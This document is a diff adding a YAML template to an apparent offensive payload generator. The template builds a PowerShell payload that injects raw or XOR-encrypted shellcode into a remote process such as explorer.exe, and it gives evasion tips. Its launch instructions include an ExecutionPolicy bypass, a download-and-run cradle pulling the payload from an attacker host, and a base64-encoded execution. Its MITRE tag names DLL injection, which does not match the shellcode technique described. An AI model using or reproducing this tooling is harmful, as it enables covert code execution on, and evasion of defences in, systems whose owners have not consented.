@@ -1,0 +1,80 @@
+recipe_type: "template"
+
+name: "Process Injection - PowerShell"
+description: |
+  Classic process injection using PowerShell reflection to call Win32 APIs.
+  Injects shellcode into a remote process (default: explorer.exe) using
+  OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.
+  
+  Medium effectiveness - can be detected by modern EDR and behavioral monitoring.
+  Consider using AES-encrypted shellcode variant for better evasion.
+
+mitre:
+  tactic: "TA0005 - Defense Evasion"
+  technique: "T1055.001 - Process Injection: Dynamic-link Library Injection"
+
+effectiveness: "medium"
+
+artifacts:
+  - "Suspicious PowerShell process tree and command line"
+  - "Memory allocation in remote process with RWX permissions"
+  - "CreateRemoteThread API calls visible to ETW/EDR"
+  - "Unsigned PowerShell script execution (if not bypassed)"
+  - "Sysmon Event ID 8 (CreateRemoteThread)"
+  - "Sysmon Event ID 10 (ProcessAccess)"
+
+parameters:
+  - name: "target_process"
+    type: "string"
+    description: "Target process name to inject into (e.g., explorer, notepad)"
+    required: true
+    default: "explorer"
+
+  - name: "shellcode_file"
+    type: "file"
+    description: "Path to raw shellcode binary"
+    required: true
+    example: "./shellcode.bin"
+
+  - name: "output_dir"
+    type: "path"
+    description: "Directory to save generated payload"
+    required: true
+    default: "./output"
+
+sub_recipes:
+  - name: "Plain Shellcode"
+    description: "Inject raw shellcode without encryption (less stealthy)"
+    source_template: "payloads/process_injection/process_injection.ps1"
+    preprocessing:
+      - type: "none"
+
+  - name: "XOR Encrypted Shellcode"
+    description: "XOR encrypt shellcode before injection"
+    source_template: "payloads/process_injection/process_injection_xor.ps1"
+    parameters:
+      - name: "xor_key"
+        type: "hex"
+        description: "XOR encryption key (2 hex digits)"
+        required: false
+        auto_generate: true
+        default: "fa"
+    preprocessing:
+      - type: "xor_encrypt"
+        input: "shellcode_file"
+        key: "xor_key"
+
+output:
+  type: "file"
+  filename_pattern: "process_injection_{timestamp}.ps1"
+
+launch_instructions: |
+  # Execute PowerShell payload:
+  powershell.exe -ExecutionPolicy Bypass -File {{ output_filename }}
+  
+  # Or run from memory:
+  IEX(New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_filename }}')
+  
+  # Or encoded:
+  $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("{{ output_filename }}"))
+  powershell.exe -EncodedCommand $b64
